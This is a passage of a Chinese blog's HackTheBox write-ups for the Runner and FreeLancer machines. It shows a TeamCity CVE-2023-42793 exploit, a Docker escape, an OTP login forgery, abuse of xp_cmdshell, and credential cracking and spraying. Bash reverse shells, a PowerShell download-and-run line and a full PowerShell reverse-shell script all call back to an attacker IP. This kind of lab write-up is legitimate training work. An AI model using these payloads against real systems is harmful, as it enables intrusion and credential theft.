vulscan\n[*] WebTitle http://10.10.11.19        code:301 len:169    title:301 Moved Permanently 跳转url: http://app.blurry.htb/\n```\n\n## 参考\n\nRunner\n<https://cerb3rus.medium.com/hackthebox-runner-writeup-466ffd800632>\n<https://blog.csdn.net/m0_52742680/article/details/138076335>\n<https://nitroc.org/posts/cve-2024-21626-illustrated/>\n\nFreeLancer\n<https://blog.csdn.net/m0_52742680/article/details/139441094>\n","slug":"HackTheBox 笔记 - 2","published":1,"updated":"2024-06-11T05:11:16.737Z","comments":1,"layout":"post","photos":[],"_id":"clxa5zodb000o7slz78wkh8qt","content":"<p>不得不找饭吃了。<br>Two Million / Mailing / BoardLight / Usage</p>\n<span id=\"more\"></span>\n\n<h2 id=\"Runner\"><a href=\"#Runner\" class=\"headerlink\" title=\"Runner\"></a>Runner</h2><p>扫端口，有 22，80，8000，访问 80 发现是个静态网页，dirsearch 也没扫出东西，再扫 8000，只有个 <code>/health</code> 和 <code>/version</code> 路由，也没什么用。<br>再扫子域名，也没扫出来东西，一看 wp 原来人家用的超大字典，晕</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wfuzwfuzz -c -w  /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt -u <span class=\"string\">&quot;http://runner.htb&quot;</span> -H <span class=\"string\">&quot;Host:FUZZ.runner.htb&quot;</span> --hw 10</span><br></pre></td></tr></table></figure>\n\n<p>于是就扫出来 <code>teamcity.runner.htb</code>，访问，是个 TeamCity。搜一下 CVE：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ searchsploit teamcity</span><br><span class=\"line\">------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class=\"line\"> Exploit Title                                                                                                                                   |  Path</span><br><span class=\"line\">------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class=\"line\">JetBrains TeamCity 2018.2.4 - Remote Code Execution                                                                                              | java/remote/47891.txt</span><br><span class=\"line\">JetBrains TeamCity 2023.05.3 - Remote Code Execution (RCE)                                                                                       | java/remote/51884.py</span><br><span class=\"line\">TeamCity &lt; 9.0.2 - Disabled Registration Bypass                                                                                                  | multiple/remote/46514.js</span><br><span class=\"line\">TeamCity Agent - XML-RPC Command Execution (Metasploit)                                                                                          | multiple/remote/45917.rb</span><br><span class=\"line\">TeamCity Agent XML-RPC 10.0 - Remote Code Execution                                                                                              | php/webapps/48201.py</span><br><span class=\"line\">------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class=\"line\">Shellcodes: No Results</span><br></pre></td></tr></table></figure>\n\n<p>网页写着 <code>Version 2023.05.3 (build 129390)</code>，这不正好是 CVE-2023-42793，直接 <code>searchsploit -p java/remote/51884.py</code> 找到 PoC 的位置，然后复制过来跑</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python 51884.py -u http://teamcity.runner.htb</span><br><span class=\"line\"></span><br><span class=\"line\">=====================================================</span><br><span class=\"line\">*       CVE-2023-42793                              *</span><br><span class=\"line\">*  TeamCity Admin Account Creation                  *</span><br><span class=\"line\">*                                                   *</span><br><span class=\"line\">*  Author: ByteHunter                               *</span><br><span class=\"line\">=====================================================</span><br><span class=\"line\"></span><br><span class=\"line\">Token: eyJ0eXAiOiAiVENWMiJ9.SXpoSWFONE1EaGJ3SmowbGxLMmNfSmlaZkZV.NzU0ZDU4NzYtNzU3My00ZTgwLWFmNWMtMGIyNjliZjY0ZDkw</span><br><span class=\"line\">Successfully exploited!</span><br><span class=\"line\">URL: http://teamcity.runner.htb</span><br><span class=\"line\">Username: city_adminOpx8</span><br><span class=\"line\">Password: Main_password!!**</span><br></pre></td></tr></table></figure>\n\n<p>把 Token 存到文件 <code>token</code>，然后执行这个 <a href=\"https://github.com/Zyad-Elsayed/CVE-2023-42793/blob/main/rce.py\">PoC</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python rce.py -u http://teamcity.runner.htb -t token -c <span class=\"string\">&#x27;&quot;/bin/bash&quot;&amp;params=&quot;-c&quot;&amp;params=&quot;sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.18%2F55555%200%3E%261&quot;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>然后就拿到 shell 了，得到第一个 flag。注意这里是 docker 的 shell，执行 <code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code> 换个 shell（不知道和直接 <code>bash</code> 有啥区别），传 <code>linpeas.sh</code> 执行没找到啥，但是能搜到一个 <code>id_rsa</code>。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find / -name id_rsa 2&gt; /dev/null</span><br></pre></td></tr></table></figure>\n\n<p>这里 <code>2&gt; /dev/null</code> 是把 stderr 重定向到 <code>/dev/null</code>，不然会有很多权限不足的提示。<br>在网站中的 User 里有个 john，然后就可以用这个 <code>id_rsa</code> 登录 john 了。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">chmod</span> 600 id_rsa</span><br><span class=\"line\">ssh john@runner.htb -i id_rsa</span><br></pre></td></tr></table></figure>\n\n<p>一开始报 <code>Load key &quot;id_rsa&quot;: error in libcrypto</code>，原来是末尾少打一个换行。<br>再传 <code>linpeas.sh</code> 扫一轮，发现 <code>/etc/hosts</code> 里还有个域名叫 <code>portainer-administration.runner.htb</code>，加到本机里，然后访问，发现是个 Portainer，查漏洞，没有。</p>\n<p>之前的网站是有个备份的，下载下来能找到 <code>users</code>，内容如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM</span><br><span class=\"line\">1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1717486715003, BCRYPT</span><br><span class=\"line\">2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT</span><br><span class=\"line\">11, city_adminopx8, $2a$07$K1PwHspWALRGHbsy0XaPOe7cIK2IVF5hkq8DS/t0L6ulKDCNoACY2, , angry-admin@funnybunny.org, 1717487324779, BCRYPT</span><br></pre></td></tr></table></figure>\n\n<p>用 john 把 matthew 的密码爆出来，为 <code>piper123</code>，注意 john 会把结果存在 <code>~/.john/john.pot</code> 里，再跑的话要 <code>john --show hash.txt</code> 才能显示。</p>\n<p>用这个去登录 Portainer，然后用 CVE-2024-21626 打 docker 逃逸，启动一个 container，把 working dir 挂到 <code>/proc/self/fd/8</code>，网页 shell 不好使，用 bash 弹个 shell 回来：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/10.10.16.18/55555 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n\n<p>然后 <code>cat ../../../root/root.txt</code> 就拿到第二个 flag 了。<br>无聊的时候想用 john 爆 <code>/etc/shadow</code> 里 root 的密码，发现还得加 <code>--format=crypt</code>。</p>\n<h3 id=\"后继小研究\"><a href=\"#后继小研究\" class=\"headerlink\" title=\"后继小研究\"></a>后继小研究</h3><p>发现 docker 里面没有 nano 也没有 vim，但是有 sed，执行如下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sed -i <span class=\"string\">&#x27;s/root:x:/root::/&#x27;</span> ../../../etc/passwd</span><br></pre></td></tr></table></figure>\n\n<p>然后就可以 <code>su root</code> 了，执行 <code>crontab -e</code>，发现有个定时任务。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@reboot docker start kind_leavitt</span><br><span class=\"line\">@reboot /root/monitor.sh</span><br><span class=\"line\">*/5 * * * * /root/monitor.sh</span><br><span class=\"line\">*/2 * * * * /root/docker_clean.sh</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"浅谈-Docker-涉及的一些概念\"><a href=\"#浅谈-Docker-涉及的一些概念\" class=\"headerlink\" title=\"浅谈 Docker 涉及的一些概念\"></a>浅谈 Docker 涉及的一些概念</h3><p><strong>cgroup</strong>（Control Groups）是 Linux 内核提供的一种机制，用于限制、记录和隔离进程组（如容器）的资源使用情况（如 CPU、内存、磁盘 I/O、网络带宽等）。cgroup 可以帮助系统管理员分配系统资源，以确保每个容器或进程组都能获得足够的资源，并防止单个容器或进程组消耗过多资源而影响其他容器或进程组的正常运行。<br><strong>runC</strong> 是一个符合 Open Container Initiative (OCI) 规范的容器运行时。它是一个轻量级的运行时，负责创建和运行容器。runC 可以被认为是 Docker 的默认底层运行时之一。runC 提供了对容器的直接管理接口，Docker 利用 runC 来实际执行容器操作。<br><strong>containerd</strong> 是一个高层次的容器运行时，由 Docker Inc. 维护。containerd 提供了容器生命周期管理的高级 API，支持创建、管理和运行容器。它内部可以调用 runC 或其他 OCI 兼容的运行时来实际执行容器操作。containerd 是 Docker 的核心组件之一，负责管理容器运行时的交互。<br><strong>CRI-O</strong> 是 Kubernetes 的一个容器运行时接口（CRI）实现，专门为 Kubernetes 设计。它直接运行 OCI 容器，使用 runC 或 Kata Containers 作为底层运行时。CRI-O 提供了一个轻量级的运行时环境，专注于 Kubernetes 的需求。</p>\n<blockquote>\n<p>总结：Docker 使用 containerd 作为其核心运行时，containerd 内部则调用 runC 或其他运行时来实际管理容器，所有的容器运行时都依赖 cgroup 来实现资源隔离和管理。</p>\n</blockquote>\n<h2 id=\"FreeLancer\"><a href=\"#FreeLancer\" class=\"headerlink\" title=\"FreeLancer\"></a>FreeLancer</h2><p>fscan 开扫，疑惑了很久怎么打，原来是环境问题，80 端口我没扫到，现在应该修好了。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ fscan -h 10.10.11.5 -p 1-65535</span><br><span class=\"line\"></span><br><span class=\"line\">   ___                              _</span><br><span class=\"line\">  / _ \\     ___  ___ _ __ __ _  ___| | __</span><br><span class=\"line\"> / /_\\/____/ __|/ __| <span class=\"string\">&#x27;__/ _` |/ __| |/ /</span></span><br><span class=\"line\"><span class=\"string\">/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   &lt;</span></span><br><span class=\"line\"><span class=\"string\">\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\</span></span><br><span class=\"line\"><span class=\"string\">                     fscan version: 1.8.4</span></span><br><span class=\"line\"><span class=\"string\">start infoscan</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:88 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:139 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:135 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:53 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:593 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:80 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:464 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:389 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:445 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:636 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:3269 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:3268 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:5985 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:9389 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:47001 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:49667 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:49669 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:49665 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:49671 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:49670 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:49664 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:49675 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:49672 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:49666 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:49815 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:55297 open</span></span><br><span class=\"line\"><span class=\"string\">[*] alive ports len is: 26</span></span><br><span class=\"line\"><span class=\"string\">start vulscan</span></span><br><span class=\"line\"><span class=\"string\">[*] WebTitle http://10.10.11.5         code:302 len:0      title:None 跳转url: http://freelancer.htb/</span></span><br><span class=\"line\"><span class=\"string\">[*] NetInfo</span></span><br><span class=\"line\"><span class=\"string\">[*]10.10.11.5</span></span><br><span class=\"line\"><span class=\"string\">   [-&gt;]DC</span></span><br><span class=\"line\"><span class=\"string\">   [-&gt;]10.10.11.5</span></span><br><span class=\"line\"><span class=\"string\">[*] WebTitle http://10.10.11.5:5985    code:404 len:315    title:Not Found</span></span><br><span class=\"line\"><span class=\"string\">[*] WebTitle http://10.10.11.5:47001   code:404 len:315    title:Not Found</span></span><br><span class=\"line\"><span class=\"string\">[*] WebTitle http://freelancer.htb/    code:200 len:57293  title:Freelancer - Job Board &amp; Hiring platform</span></span><br><span class=\"line\"><span class=\"string\">已完成 26/26</span></span><br><span class=\"line\"><span class=\"string\">[*] 扫描结束,耗时: 1m15.097074037s</span></span><br></pre></td></tr></table></figure>\n\n<p>老样子加进 hosts，访问，是个招聘网站，用 dirsearch 一顿扫，结果里面一堆 <code>/admin</code> 路由的。<br>注册了一个 employer 的帐号，密码还不能太简单，登录说没激活，点击忘记密码，重置一次，就能登录了。<br>有个二维码登录的功能，说用手机扫就能直接登录，随便找个<a href=\"https://zxing.org/w/decode.jspx\">在线识别网站</a>识别出 <code>http://freelancer.htb/accounts/login/otp/MTAwMTA=/700a374a3c075b4da499d76a39953af6/</code></p>\n<p><code>MTAwMTA=</code> base64 解出是 <code>10010</code>，猜测是用户的 ID，后面应该是关于时间的凭据。在 Blog 里随便发表一条评论，然后自己的链接就是 <code>http://freelancer.htb/accounts/profile/visit/10010/</code> ，那么就八九不离十了，从 1 开始试，发现 <code>http://freelancer.htb/accounts/profile/visit/2/</code> 可以访问到，而且 username 是 admin，那么尝试伪造 admin 登录，2 对应 base64 即为 <code>Mg==</code>，拼接链接 <code>http://freelancer.htb/accounts/login/otp/Mg==/700a374a3c075b4da499d76a39953af6/</code> 成功登录 admin。</p>\n<p>登上之后页面和之前差不多，直接进 <code>/admin</code> 路由，到了管理页面。一眼看到 SQL Terminal，GPT 说可以用 xp_cmdshell 执行命令，发现没权限</p>\n<p>执行如下命令：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> name <span class=\"keyword\">AS</span> DatabaseName, suser_sname(owner_sid) <span class=\"keyword\">AS</span> Owner</span><br><span class=\"line\"><span class=\"keyword\">FROM</span> sys.databases;</span><br></pre></td></tr></table></figure>\n\n<p>可以看到 Owner 全部是 sa，然后模拟 sa 登录，执行如下命令启用 xp_cmdshell：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">EXECUTE</span> <span class=\"keyword\">AS</span> LOGIN <span class=\"operator\">=</span> <span class=\"string\">&#x27;sa&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">EXEC</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>, <span class=\"number\">1</span>;</span><br><span class=\"line\">RECONFIGURE;</span><br><span class=\"line\"><span class=\"keyword\">EXEC</span> sp_configure <span class=\"string\">&#x27;xp_cmdshell&#x27;</span>, <span class=\"number\">1</span>;</span><br><span class=\"line\">RECONFIGURE;</span><br></pre></td></tr></table></figure>\n\n<p>再</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">EXEC</span> xp_cmdshell <span class=\"string\">&#x27;dir&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>发现命令执行成功。<br>想弹个 shell，搞着搞着发现 bash 不了，才想起来这是 Windows</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">EXECUTE</span> xp_cmdshell <span class=\"string\">&#x27;powershell -c iex(iwr -usebasicparsing http://10.10.16.18/1.ps1)&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>发现弹了一下就断了，应该是被杀软掐了。<br>试了很多个都不行，没办法了，用大哥找到的：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">do &#123;</span><br><span class=\"line\">    # Delay before establishing network connection, and between retries</span><br><span class=\"line\">    Start-Sleep -Seconds 1</span><br><span class=\"line\"></span><br><span class=\"line\">    # Connect to C2</span><br><span class=\"line\">    try&#123;</span><br><span class=\"line\">        $TCPClient = New-Object Net.Sockets.TCPClient(&#x27;10.10.16.18&#x27;,55555)</span><br><span class=\"line\">    &#125; catch &#123;&#125;</span><br><span class=\"line\">&#125; until ($TCPClient.Connected)</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">NetworkStream = <span class=\"variable\">$TCPClient</span>.GetStream()</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">StreamWriter = New-Object IO.StreamWriter(<span class=\"variable\">$NetworkStream</span>)</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Writes a string to C2</span></span><br><span class=\"line\">function WriteToStream ($String) &#123;</span><br><span class=\"line\">    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)</span><br><span class=\"line\">    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % &#123;0&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    # Write to C2</span><br><span class=\"line\">    $StreamWriter.Write($String + &#x27;SHELL&gt; &#x27;)</span><br><span class=\"line\">    $StreamWriter.Flush()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Initial output to C2. The <span class=\"keyword\">function</span> also creates the inital empty byte array buffer used below.</span></span><br><span class=\"line\">WriteToStream &#x27;&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Loop that breaks <span class=\"keyword\">if</span> NetworkStream.Read throws an exception - will happen <span class=\"keyword\">if</span> connection is closed.</span></span><br><span class=\"line\"><span class=\"meta prompt_\">while(($</span><span class=\"language-bash\">BytesRead = <span class=\"variable\">$NetworkStream</span>.Read(<span class=\"variable\">$Buffer</span>, 0, <span class=\"variable\">$Buffer</span>.Length)) -gt 0) &#123;</span></span><br><span class=\"line\">    # Encode command, remove last byte/newline</span><br><span class=\"line\">    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)</span><br><span class=\"line\">    </span><br><span class=\"line\">    # Execute command and save output (including errors thrown)</span><br><span class=\"line\">    $Output = try &#123;</span><br><span class=\"line\">            Invoke-Expression $Command 2&gt;&amp;1 | Out-String</span><br><span class=\"line\">        &#125; catch &#123;</span><br><span class=\"line\">            $_ | Out-String</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    # Write output to C2</span><br><span class=\"line\">    WriteToStream ($Output)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Closes the StreamWriter and the underlying TCPClient</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">StreamWriter.Close()</span></span><br></pre></td></tr></table></figure>\n\n<p>看到用户文件夹下的 <code>Download</code> 有个 <code>SQLEXPR-2019_x64_ENU</code> 目录，进去发现 <code>sql-Configuration.INI</code>，内容如下：</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[OPTIONS]</span></span><br><span class=\"line\"><span class=\"attr\">ACTION</span>=<span class=\"string\">&quot;Install&quot;</span></span><br><span class=\"line\"><span class=\"attr\">QUIET</span>=<span class=\"string\">&quot;True&quot;</span></span><br><span class=\"line\"><span class=\"attr\">FEATURES</span>=SQL</span><br><span class=\"line\"><span class=\"attr\">INSTANCENAME</span>=<span class=\"string\">&quot;SQLEXPRESS&quot;</span></span><br><span class=\"line\"><span class=\"attr\">INSTANCEID</span>=<span class=\"string\">&quot;SQLEXPRESS&quot;</span></span><br><span class=\"line\"><span class=\"attr\">RSSVCACCOUNT</span>=<span class=\"string\">&quot;NT Service\\ReportServer$SQLEXPRESS&quot;</span></span><br><span class=\"line\"><span class=\"attr\">AGTSVCACCOUNT</span>=<span class=\"string\">&quot;NT AUTHORITY\\NETWORK SERVICE&quot;</span></span><br><span class=\"line\"><span class=\"attr\">AGTSVCSTARTUPTYPE</span>=<span class=\"string\">&quot;Manual&quot;</span></span><br><span class=\"line\"><span class=\"attr\">COMMFABRICPORT</span>=<span class=\"string\">&quot;0&quot;</span></span><br><span class=\"line\"><span class=\"attr\">COMMFABRICNETWORKLEVEL</span>=<span class=\"string\">&quot;&quot;</span><span class=\"number\">0</span><span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">COMMFABRICENCRYPTION=&quot;</span><span class=\"number\">0</span><span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">MATRIXCMBRICKCOMMPORT=&quot;</span><span class=\"number\">0</span><span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">SQLSVCSTARTUPTYPE=&quot;</span>Automatic<span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">FILESTREAMLEVEL=&quot;</span><span class=\"number\">0</span><span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">ENABLERANU=&quot;</span><span class=\"literal\">False</span><span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">SQLCOLLATION=&quot;</span>SQL_Latin1_General_CP1_CI_AS<span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">SQLSVCACCOUNT=&quot;</span>FREELANCER\\sql_svc<span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">SQLSVCPASSWORD=&quot;</span>IL0v3ErenY3ager<span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">SQLSYSADMINACCOUNTS=&quot;</span>FREELANCER\\Administrator<span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">SECURITYMODE=&quot;</span>SQL<span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">SAPWD=&quot;</span>t3mp0r@ryS@PWD<span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">ADDCURRENTUSERASSQLADMIN=&quot;</span><span class=\"literal\">False</span><span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">TCPENABLED=&quot;</span><span class=\"number\">1</span><span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">NPENABLED=&quot;</span><span class=\"number\">1</span><span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">BROWSERSVCSTARTUPTYPE=&quot;</span>Automatic<span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">IAcceptSQLServerLicenseTerms=True</span></span><br></pre></td></tr></table></figure>\n\n<p>用这两个密码和 Users 文件夹下的用户开爆</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ craccrackmapexec smb 10.10.11.5 -u user.txt -p passwd.txt</span><br><span class=\"line\">SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)</span><br><span class=\"line\">SMB         